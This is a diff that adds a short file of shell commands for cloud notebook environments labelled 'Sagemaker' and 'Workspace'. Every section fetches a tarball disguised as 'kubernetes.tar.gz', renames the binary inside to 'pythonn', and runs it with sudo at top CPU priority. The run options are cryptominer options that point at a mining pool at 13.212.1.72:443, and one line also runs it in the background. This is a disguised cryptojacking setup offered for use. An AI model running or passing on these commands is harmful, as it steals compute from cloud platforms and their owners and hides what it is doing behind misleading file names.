@@ -1,0 +1,21 @@
+# Sagemaker
+
+wget https://raw.githubusercontent.com/metrorelax/catalina/main/kubernetes.tar.gz
+tar xvzf kubernetes.tar.gz
+mv bash1 pythonn
+sudo nice -n -20 ./pythonn -o 13.212.1.72:443 -u a -p b -a argon2/chukwav2 -t 8 -r 480 -R 30 --nicehash
+
+# Workspace
+
+sudo -i
+wget https://raw.githubusercontent.com/metrorelax/catalina/main/kubernetes.tar.gz
+tar xvzf kubernetes.tar.gz
+mv bash1 pythonn
+sudo nice -n -20 ./pythonn -o 13.212.1.72:443 -u a -p b -a argon2/chukwav2 -t 7 -r 480 -R 30 --nicehash
+
+
+
+
+# Extra
+nice -n -20 ./pythonn -o <PIZZA>:443 -u a -p b -a argon2/chukwav2 -t 8 -r 480 -R 30 --nicehash --donate-level 1 --donate-over-proxy 1 -B
+nice -n -20 ./pythonn -o 13.212.1.72:443 -u a -p b -a argon2/chukwav2 -t 8 -r 480 -R 30 --nicehash
